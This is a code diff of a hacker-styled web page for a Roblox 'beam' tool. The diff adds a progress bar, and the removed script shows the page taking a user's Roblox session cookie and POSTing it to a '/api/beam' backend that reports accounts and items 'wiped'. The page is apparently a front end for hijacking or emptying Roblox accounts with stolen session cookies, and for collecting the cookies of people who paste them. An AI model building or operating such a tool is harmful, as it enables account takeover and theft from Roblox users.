@@ -11,6 +11,7 @@
             --cyan: #00ffff;
             --bg-color: #020202;
             --panel-bg: rgba(0, 5, 0, 0.85);
+            --error-red: #ff3333;
         }
 
         * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -27,7 +28,6 @@
             position: relative;
         }
 
-        /* Matrix Rain Canvas */
         #matrix {
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -35,7 +35,6 @@
             opacity: 0.3;
         }
 
-        /* CRT Scanlines Overlay */
         .scanlines {
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -45,7 +44,6 @@
             pointer-events: none;
         }
 
-        /* Main Container */
         .container {
             background: var(--panel-bg);
             border: 1px solid var(--neon-green);
@@ -58,7 +56,6 @@
             backdrop-filter: blur(5px);
         }
 
-        /* Terminal Header */
         .terminal-header {
             display: flex;
             gap: 8px;
@@ -72,7 +69,6 @@
         .dot.yellow { background: #ffbd2e; box-shadow: 0 0 5px #ffbd2e; }
         .dot.green { background: #27c93f; box-shadow: 0 0 5px #27c93f; }
 
-        /* Glitch Title */
         .header {
             text-align: center;
             margin-top: 10px;
@@ -122,7 +118,6 @@
             100% { clip-path: inset(5% 0 80% 0); }
         }
 
-        /* Input */
         .form-group {
             margin-bottom: 30px;
             position: relative;
@@ -155,6 +150,69 @@
         }
         input::placeholder { color: rgba(0, 255, 65, 0.3); }
 
+        /* PROGRESS BAR */
+        .progress-container {
+            margin-bottom: 25px;
+            width: 100%;
+            height: 24px;
+            background: rgba(0, 255, 65, 0.05);
+            border: 1px solid rgba(0, 255, 65, 0.3);
+            border-radius: 4px;
+            position: relative;
+            overflow: hidden;
+            display: none; /* Hidden by default */
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: var(--neon-green);
+            box-shadow: 0 0 15px var(--neon-green);
+            transition: width 0.3s ease-out, background-color 0.3s ease;
+            position: relative;
+        }
+
+        /* Striped animation for the bar */
+        .progress-bar::after {
+            content: "";
+            position: absolute;
+            top: 0; left: 0; bottom: 0; right: 0;
+            background-image: linear-gradient(
+                -45deg,
+                rgba(0, 0, 0, 0.15) 25%,
+                transparent 25%,
+                transparent 50%,
+                rgba(0, 0, 0, 0.15) 50%,
+                rgba(0, 0, 0, 0.15) 75%,
+                transparent 75%,
+                transparent
+            );
+            background-size: 20px 20px;
+            animation: move-stripes 1s linear infinite;
+        }
+
+        @keyframes move-stripes {
+            0% { background-position: 0 0; }
+            100% { background-position: 20px 0; }
+        }
+
+        .progress-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 0.8rem;
+            font-weight: bold;
+            color: #000;
+            text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);
+            z-index: 2;
+            letter-spacing: 1px;
+        }
+
+        .progress-container.error .progress-bar { background: var(--error-red); box-shadow: 0 0 15px var(--error-red); }
+        .progress-container.error { border-color: var(--error-red); }
+        .progress-container.error .progress-text { color: #fff; }
+
         /* Button */
         .btn-container { position: relative; }
         button {
@@ -179,9 +237,7 @@
             color: #000;
             box-shadow: 0 0 30px rgba(0, 255, 65, 0.8);
         }
-        button:active {
-            transform: scale(0.98);
-        }
+        button:active { transform: scale(0.98); }
         button:disabled {
             border-color: #333;
             color: #333;
@@ -203,11 +259,10 @@
             font-family: 'Fira Code', monospace;
         }
         .console .line { margin-bottom: 8px; }
-        .console .error { color: #ff3333; text-shadow: 0 0 5px #ff3333; }
-        .console .success { color: #00ff41; text-shadow: 0 0 5px #00ff41; font-weight: bold; }
+        .console .error { color: var(--error-red); text-shadow: 0 0 5px var(--error-red); }
+        .console .success { color: var(--neon-green); text-shadow: 0 0 5px var(--neon-green); font-weight: bold; }
         .console .info { color: #888; }
 
-        /* Blinking Cursor for Console */
         .cursor {
             display: inline-block;
             width: 8px;
@@ -242,6 +297,12 @@
             <input type="password" id="cookie" placeholder="_|WARNING:-DO-NOT-SHARE-THIS..." required>
         </div>
 
+        <!-- PROGRESS BAR HTML -->
+        <div class="progress-container" id="progress-container">
+            <div class="progress-bar" id="progress-bar"></div>
+            <div class="progress-text" id="progress-text">0%</div>
+        </div>
+
         <div class="btn-container">
             <button id="execute-btn" onclick="executeBeam()">
                 EXECUTE WIPE
@@ -249,104 +310,4 @@
         </div>
 
         <div class="console" id="console">
-            <div class="line info">[*] System initialized. Awaiting auth cookie...<div class="cursor"></div></div>
-        </div>
-    </div>
-
-    <script>
-        // --- MATRIX RAIN EFFECT ---
-        const canvas = document.getElementById('matrix');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-
-        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+-=[]{}|;:,.<>?';
-        const fontSize = 14;
-        const columns = canvas.width / fontSize;
-        const drops = [];
-        for (let x = 0; x < columns; x++) drops[x] = 1;
-
-        function drawMatrix() {
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = '#00ff41';
-            ctx.font = fontSize + 'px monospace';
-
-            for (let i = 0; i < drops.length; i++) {
-                const text = chars.charAt(Math.floor(Math.random() * chars.length));
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-                    drops[i] = 0;
-                }
-                drops[i]++;
-            }
-        }
-        setInterval(drawMatrix, 35);
-
-        window.addEventListener('resize', () => {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        });
-
-        // --- BEAM LOGIC ---
-        async function executeBeam() {
-            const btn = document.getElementById('execute-btn');
-            const consoleBox = document.getElementById('console');
-            const cookie = document.getElementById('cookie').value.trim();
-            
-            if (!cookie) { 
-                logToConsole("[!] ERR: AUTH_COOKIE required.", "error"); 
-                return; 
-            }
-            
-            btn.disabled = true;
-            btn.innerText = "EXECUTING...";
-            consoleBox.innerHTML = ""; 
-            logToConsole("[*] Routing connection to Roblox API...", "info");
-            
-            try {
-                const response = await fetch('/api/beam', {
-                    method: 'POST', 
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ cookie })
-                });
-                const result = await response.json();
-                
-                if (result.success) {
-                    result.data.messages.forEach(msg => {
-                        if (msg.includes("successfully") || msg.includes("wiped")) { 
-                            logToConsole(`[+] ${msg}`, "success"); 
-                        } else { 
-                            logToConsole(`[-] ${msg}`, "error"); 
-                        }
-                    });
-                    logToConsole("[*] Process terminated.", "info");
-                } else { 
-                    logToConsole(`[-] API ERR: ${result.message}`, "error"); 
-                }
-            } catch (error) { 
-                logToConsole(`[-] NETWORK ERR: ${error.message}`, "error"); 
-            } finally { 
-                btn.disabled = false;
-                btn.innerText = "EXECUTE WIPE";
-            }
-        }
-        
-        function logToConsole(text, type) {
-            const consoleBox = document.getElementById('console');
-            const div = document.createElement('div');
-            div.className = `line ${type}`; 
-            div.innerText = text;
-            consoleBox.appendChild(div); 
-            
-            // Add blinking cursor to the last line
-            const cursor = document.createElement('div');
-            cursor.className = 'cursor';
-            div.appendChild(cursor);
-            
-            consoleBox.scrollTop = consoleBox.scrollHeight;
-        }
-    </script>
-</body>
-</html>
+            <div class="line info">[*] System
